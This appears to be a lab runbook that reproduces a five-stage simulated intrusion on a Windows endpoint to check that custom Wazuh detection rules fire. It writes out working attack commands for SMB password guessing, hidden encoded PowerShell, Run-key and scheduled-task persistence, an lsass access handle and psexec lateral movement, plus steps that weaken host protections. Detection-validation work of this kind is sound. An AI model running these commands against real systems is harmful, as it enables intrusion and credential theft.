# IR-2026-001 — Attack Chain Reproduction

Reproducible steps for the simulated multi-stage intrusion analysed in
[`README.md`](./README.md). Five stages, executed in order against
`windows-endpoint` (192.168.18.134) from the lab server (192.168.18.132).

> Controlled lab only. Each stage maps to a custom Wazuh detection; the point
> of the exercise is to validate end-to-end detection coverage.

## Environment prep

Windows endpoint (PowerShell as Admin) — weakens the host so every stage is
observable; all of this is reverted in cleanup:

```powershell
net user labtest /delete
net user labtest "LabPass123!" /add
net localgroup Administrators labtest /add
New-NetFirewallRule -DisplayName "LAB-SMB-In-Test" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow -Profile Any
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
Restart-Computer -Force
```

## Stage 1 — Initial Access (T1110.001) — rule 100204

Lab server. 9 failed SMB logons (under the 10-attempt lockout threshold) then 2 successes:

```bash
for i in $(seq 1 9); do
  smbclient -L //192.168.18.134 -U "labtest%WrongPass_${i}" -t 5 2>&1 | grep -oE "NT_STATUS_[A-Z_]+"
  sleep 1
done
sleep 5
smbclient -L //192.168.18.134 -U "labtest%LabPass123!" -t 5
smbclient -L //192.168.18.134 -U "labtest%LabPass123!" -t 5
```

## Stage 2 — Execution (T1059.001) — rule 100200

Windows endpoint (PowerShell as Admin). Encoded command with evasion flags:

```powershell
$cmd = 'Write-Output "IR-2026-001 stage 2 payload executed"; whoami'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $enc
```

## Stage 3 — Persistence (T1547.001 + T1053.005) — rules 100201, 100203

Windows endpoint (PowerShell as Admin). Run key + scheduled task:

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v IR2026Updater /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -File C:\Users\Public\update.ps1" /f
schtasks /create /tn "IR2026_SyncTask" /tr "powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand SQBSACAAMgAwADIANgA=" /sc onlogon /f
```

## Stage 4 — Credential Access (T1003.001) — rule 100202

Windows endpoint (PowerShell as Admin). Opens `lsass.exe` with `PROCESS_ALL_ACCESS`:

```powershell
$src = @"
using System;
using System.Runtime.InteropServices;
public class L {
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, uint p);
  [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@
Add-Type $src
$lsass = (Get-Process lsass).Id
$h = [L]::OpenProcess(0x1FFFFF, $false, $lsass)
if ($h -ne [IntPtr]::Zero) { "opened lsass PID $lsass"; [L]::CloseHandle($h) | Out-Null }
```

## Stage 5 — Lateral Movement (T1021.002) — rule 100205

Lab server. `psexec` over SMB — drops a service binary on `ADMIN$` and runs it:

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py labtest:'LabPass123!'@192.168.18.134
```

Type `exit` at the resulting shell. The service install fires event 7045
regardless of whether the interactive shell attaches.

## Verification

Lab server — confirm each rule fired:

```bash
for r in 100204 100200 100201 100203 100202 100205; do
  echo "rule $r: $(sudo grep -c "\"id\":\"$r\"" /var/ossec/logs/alerts/alerts.json)"
done
```

## Cleanup

Windows endpoint (PowerShell as Admin) — reverts every prep change and removes
all attack artifacts:

```powershell
net user labtest /delete
Remove-NetFirewallRule -DisplayName "LAB-SMB-In-Test"
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v IR2026Updater /f
schtasks /delete /tn "IR2026_SyncTask" /f
Restart-Computer -Force
```

The final reboot re-applies LSA Protection.
